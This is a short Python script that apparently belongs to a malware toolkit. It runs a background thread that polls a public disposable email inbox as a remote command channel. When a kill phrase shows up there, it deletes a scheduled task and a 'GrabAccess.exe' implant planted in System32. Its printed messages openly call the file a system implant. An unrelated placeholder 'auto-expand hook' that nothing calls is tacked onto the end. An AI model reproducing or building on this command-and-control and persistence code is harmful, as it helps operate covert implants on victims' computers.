
import requests
import os
import time
import threading

KILL_PHRASE = "KILL:botbndx9977"
MAILDROP_INBOX = "https://inbox.maildrop.cc/inbox/bndx9977"
TARGET_FILE = os.path.join(os.environ["SystemRoot"], "System32", "GrabAccess.exe")

def kill():
    try:
        os.system("schtasks /delete /tn GrabAccess /f")
        if os.path.exists(TARGET_FILE):
            os.remove(TARGET_FILE)
        print("[☠] Kill command confirmed. System implant removed.")
    except Exception as e:
        print(f"[!] Kill error: {e}")
    finally:
        os._exit(0)

def kill_monitor():
    while True:
        try:
            response = requests.get(MAILDROP_INBOX, timeout=10)
            if response.status_code == 200 and KILL_PHRASE in response.text:
                print("[⚠] Kill phrase detected in inbox. Executing shutdown.")
                kill()
        except:
            pass
        time.sleep(300)  # Check every 5 minutes

if __name__ == "__main__":
    t = threading.Thread(target=kill_monitor)
    t.daemon = True
    t.start()
    print("[✓] Kill monitor running in background...")
    while True:
        time.sleep(600)


# === AUTO-EXPAND HOOK ===
def expand():
    print(f'[AUTO_EXPAND] Module {__file__} has no custom logic. Placeholder activated.')
